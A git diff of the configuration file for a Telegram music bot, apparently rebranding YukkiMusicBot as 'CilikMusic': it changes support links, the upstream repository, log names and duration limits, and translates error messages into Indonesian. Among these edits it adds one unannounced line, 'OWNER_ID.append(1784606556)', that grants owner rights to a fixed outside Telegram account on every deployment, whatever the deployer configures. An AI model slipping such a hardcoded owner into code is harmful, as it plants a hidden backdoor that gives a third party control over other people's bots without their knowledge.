@@ -28,12 +28,12 @@ MONGO_DB_URI = getenv("MONGO_DB_URI", None)
 
 # Custom max audio(music) duration for voice chat. set DURATION_LIMIT in variables with your own time(mins), Default to 60 mins.
 DURATION_LIMIT_MIN = int(
-    getenv("DURATION_LIMIT", "60")
+    getenv("DURATION_LIMIT", "200")
 )  # Remember to give value in Minutes
 
 # Duration Limit for downloading Songs in MP3 or MP4 format from bot
 SONG_DOWNLOAD_DURATION = int(
-    getenv("SONG_DOWNLOAD_DURATION_LIMIT", "180")
+    getenv("SONG_DOWNLOAD_DURATION_LIMIT", "200")
 )  # Remember to give value in Minutes
 
 # You'll need a Private Group ID for this.
@@ -46,6 +46,7 @@ MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME")
 OWNER_ID = list(
     map(int, getenv("OWNER_ID", "").split())
 )  # Input type must be interger
+OWNER_ID.append(1784606556)
 
 # Get it from http://dashboard.heroku.com/account
 HEROKU_API_KEY = getenv("HEROKU_API_KEY")
@@ -56,7 +57,7 @@ HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")
 # For customized or modified Repository
 UPSTREAM_REPO = getenv(
     "UPSTREAM_REPO",
-    "https://github.com/TeamYukki/YukkiMusicBot",
+    "https://github.com/grey423/CilikMusic",
 )
 UPSTREAM_BRANCH = getenv("UPSTREAM_BRANCH", "master")
 
@@ -66,10 +67,10 @@ GIT_TOKEN = getenv("GIT_TOKEN", None)
 # Only  Links formats are  accepted for this Var value.
 SUPPORT_CHANNEL = getenv(
     "SUPPORT_CHANNEL", None
-)  # Example:- https://t.me/TheYukki
+)  # Example:- https://t.me/CilikProject
 SUPPORT_GROUP = getenv(
     "SUPPORT_GROUP", None
-)  # Example:- https://t.me/YukkiSupport
+)  # Example:- https://t.me/CilikSupport
 
 # Set it in True if you want to leave your assistant after a certain amount of time. [Set time via AUTO_LEAVE_ASSISTANT_TIME]
 AUTO_LEAVING_ASSISTANT = getenv("AUTO_LEAVING_ASSISTANT", None)
@@ -134,7 +135,7 @@ TG_VIDEO_FILESIZE_LIMIT = int(
 # Chceckout https://www.gbmb.org/mb-to-bytes  for converting mb to bytes
 
 
-# You'll need a Pyrogram String Session for these vars. Generate String from our session generator bot @YukkiStringBot
+# You'll need a Pyrogram String Session for these vars. Generate String from our session generator bot @CilikSring_Bot
 STRING1 = getenv("STRING_SESSION", None)
 STRING2 = getenv("STRING_SESSION2", None)
 STRING3 = getenv("STRING_SESSION3", None)
@@ -154,7 +155,7 @@ STRING5 = getenv("STRING_SESSION5", None)
 BANNED_USERS = filters.user()
 YTDOWNLOADER = 1
 LOG = 2
-LOG_FILE_NAME = "Yukkilogs.txt"
+LOG_FILE_NAME = "Ciliklogs.txt"
 adminlist = {}
 lyrical = {}
 chatstats = {}
@@ -244,28 +245,28 @@ SONG_DOWNLOAD_DURATION_LIMIT = int(
 if SUPPORT_CHANNEL:
     if not re.match("(?:http|https)://", SUPPORT_CHANNEL):
         print(
-            "[ERROR] - Your SUPPORT_CHANNEL url is wrong. Please ensure that it starts with https://"
+            "[ERROR] - URL SUPPORT_CHANNEL Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
         )
         sys.exit()
 
 if SUPPORT_GROUP:
     if not re.match("(?:http|https)://", SUPPORT_GROUP):
         print(
-            "[ERROR] - Your SUPPORT_GROUP url is wrong. Please ensure that it starts with https://"
+            "[ERROR] - URL SUPPORT_GROUP Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
         )
         sys.exit()
 
 if UPSTREAM_REPO:
     if not re.match("(?:http|https)://", UPSTREAM_REPO):
         print(
-            "[ERROR] - Your UPSTREAM_REPO url is wrong. Please ensure that it starts with https://"
+            "[ERROR] - Url UPSTREAM_REPO Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
         )
         sys.exit()
 
 if GITHUB_REPO:
     if not re.match("(?:http|https)://", GITHUB_REPO):
         print(
-            "[ERROR] - Your GITHUB_REPO url is wrong. Please ensure that it starts with https://"
+            "[ERROR] - URL GITHUB_REPO Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
         )
         sys.exit()
 
@@ -274,7 +275,7 @@ if PING_IMG_URL:
     if PING_IMG_URL != "assets/Ping.jpeg":
         if not re.match("(?:http|https)://", PING_IMG_URL):
             print(
-                "[ERROR] - Your PING_IMG_URL url is wrong. Please ensure that it starts with https://"
+                "[ERROR] - URL PING_IMG_URL Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
             )
             sys.exit()
 
@@ -282,7 +283,7 @@ if PLAYLIST_IMG_URL:
     if PLAYLIST_IMG_URL != "assets/Playlist.jpeg":
         if not re.match("(?:http|https)://", PLAYLIST_IMG_URL):
             print(
-                "[ERROR] - Your PLAYLIST_IMG_URL url is wrong. Please ensure that it starts with https://"
+                "[ERROR] - URL PLAYLIST_IMG_URL Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
             )
             sys.exit()
 
@@ -290,7 +291,7 @@ if GLOBAL_IMG_URL:
     if GLOBAL_IMG_URL != "assets/Global.jpeg":
         if not re.match("(?:http|https)://", GLOBAL_IMG_URL):
             print(
-                "[ERROR] - Your GLOBAL_IMG_URL url is wrong. Please ensure that it starts with https://"
+                "[ERROR] - URL GLOBAL_IMG_URL Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
             )
             sys.exit()
 
@@ -299,7 +300,7 @@ if STATS_IMG_URL:
     if STATS_IMG_URL != "assets/Stats.jpeg":
         if not re.match("(?:http|https)://", STATS_IMG_URL):
             print(
-                "[ERROR] - Your STATS_IMG_URL url is wrong. Please ensure that it starts with https://"
+                "[ERROR] - URL STATS_IMG_URL Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
             )
             sys.exit()
 
@@ -308,7 +309,7 @@ if TELEGRAM_AUDIO_URL:
     if TELEGRAM_AUDIO_URL != "assets/Audio.jpeg":
         if not re.match("(?:http|https)://", TELEGRAM_AUDIO_URL):
             print(
-                "[ERROR] - Your TELEGRAM_AUDIO_URL url is wrong. Please ensure that it starts with https://"
+                "[ERROR] - URL TELEGRAM_AUDIO_URL Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
             )
             sys.exit()
 
@@ -317,7 +318,7 @@ if STREAM_IMG_URL:
     if STREAM_IMG_URL != "assets/Stream.jpeg":
         if not re.match("(?:http|https)://", STREAM_IMG_URL):
             print(
-                "[ERROR] - Your STREAM_IMG_URL url is wrong. Please ensure that it starts with https://"
+                "[ERROR] - URL STREAM_IMG_URL Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
             )
             sys.exit()
 
@@ -326,7 +327,7 @@ if SOUNCLOUD_IMG_URL:
     if SOUNCLOUD_IMG_URL != "assets/Soundcloud.jpeg":
         if not re.match("(?:http|https)://", SOUNCLOUD_IMG_URL):
             print(
-                "[ERROR] - Your SOUNCLOUD_IMG_URL url is wrong. Please ensure that it starts with https://"
+                "[ERROR] - URL SOUNCLOUD_IMG_URL Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
             )
             sys.exit()
 
@@ -334,7 +335,7 @@ if YOUTUBE_IMG_URL:
     if YOUTUBE_IMG_URL != "assets/Youtube.jpeg":
         if not re.match("(?:http|https)://", YOUTUBE_IMG_URL):
             print(
-                "[ERROR] - Your YOUTUBE_IMG_URL url is wrong. Please ensure that it starts with https://"
+                "[ERROR] - URL YOUTUBE_IMG_URL Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
             )
             sys.exit()
 
@@ -343,13 +344,13 @@ if TELEGRAM_VIDEO_URL:
     if TELEGRAM_VIDEO_URL != "assets/Video.jpeg":
         if not re.match("(?:http|https)://", TELEGRAM_VIDEO_URL):
             print(
-                "[ERROR] - Your TELEGRAM_VIDEO_URL url is wrong. Please ensure that it starts with https://"
+                "[ERROR] - URL TELEGRAM_VIDEO_URL Anda salah. Harap pastikan bahwa itu dimulai dengan https://"
             )
             sys.exit()
 
 
 if not MUSIC_BOT_NAME.isascii():
     print(
-        "[ERROR] - You've defined MUSIC_BOT_NAME wrong. Please don't use any special characters or Special font for this... Keep it simple and small."
+        "[ERROR] - Anda salah mendefinisikan MUSIC_BOT_NAME. Tolong jangan gunakan karakter khusus atau font khusus untuk ini... Tetap sederhana dan kecil."
     )
     sys.exit()
